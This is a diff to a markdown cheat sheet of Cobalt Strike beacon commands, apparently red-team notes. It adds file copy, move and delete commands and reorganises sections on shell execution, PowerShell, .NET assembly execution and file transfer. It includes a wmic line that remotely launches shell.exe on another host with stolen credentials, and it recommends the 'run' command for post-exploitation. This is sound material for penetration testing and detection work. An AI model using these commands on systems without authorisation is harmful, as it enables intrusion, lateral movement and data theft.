@@ -4,9 +4,29 @@ Search Tag: #cobalt-strike #command-and-control
 
 ## 4.1 - Navigation
 
+- Change Directories
+
 `beacon> cd <directory>`
 
-## 4.2 - Sleep and Jitter
+## 4.2 - File Manipulation
+
+- Create directory
+
+`beacon> mkdir C:\path\to\new_directory\`
+
+- Copy file
+
+`beacon> cp C:\path\to\file.txt C:\path\to\copied_file.txt`
+
+- Move file
+
+`beacon> mv C:\path\to\file.txt C:\path\to\moved_file.txt`
+
+- Delete file
+
+`beacon> rm C:\path\to\file.txt`
+
+## 4.3 - Sleep and Jitter
 
 * Set the sleep time for executing beacon commands with delay. If `sleep` is `0` it becomes interactive mode.
 
@@ -14,11 +34,11 @@ Search Tag: #cobalt-strike #command-and-control
 
 `beacon> sleep 30 15`
 
-## 4.3 - List files or directories
+## 4.4 - List files or directories
 
 `beacon> ls`
 
-## 4.4 - Execute Shell Commands
+## 4.5 - Execute Shell Commands
 
 * Execute any `shell` command that the beacon spawns a process `cmd.exe`
 
@@ -30,6 +50,14 @@ Search Tag: #cobalt-strike #command-and-control
 
 `beacon> execute <command> [args]`
 
+- Execute commands without spawning `cmd.exe` except the running process comes from the `conhost.exe`. This is highly recommended when you perform post exploitation activities.
+
+`beacon> run <command> [args]`
+
+`beacon> run arp -a`
+
+`beacon> run wmic.exe /node:<IP> /user:<username> /password:<password> win32_process call create "C:\path\to\shell.exe"`
+
 * Spawns a child process of `powershell.exe`
 
 `beacon> powershell <cmdlet> [args]`
@@ -38,29 +66,21 @@ Search Tag: #cobalt-strike #command-and-control
 
 `beacon> powerpick <cmdlet> [args]`
 
-## 4.5 - Execute Program
-
-Execute commands without spawning `cmd.exe` except the running process comes from the beacon. This is highly recommended when you perform post exploitation activities.
-
-`beacon> run <command> [args]`
-
-`beacon> run arp -a`
-
-`beacon> run wmic.exe /node:<IP> /user:<username> /password:<password> win32_process call create "C:\path\to\shell.exe"`
+## 4.6 - Execute Program
 
 Run .NET binary through a temporary process when running `spawnto` beacon command otherwise it defaults back to `rundll32.dll`
 
 `beacon> execute-assembly /path/to/compiled_dotnet_tool.exe [args]`
 
-## 4.5 - Upload and Download Files
+## 4.7 - Upload and Download Files
 
 * Upload file
 
-`beacon> upload /path/to/file.txt C:\path\to\upload_file.txt`
+`beacon> upload /path/to/local/file.txt C:\path\to\remote\file.txt`
 
 * Download file
 
-`beacon> download C:\path\to\download_file.txt`
+`beacon> download C:\path\to\file.txt`
 
 * Check file downloads
 
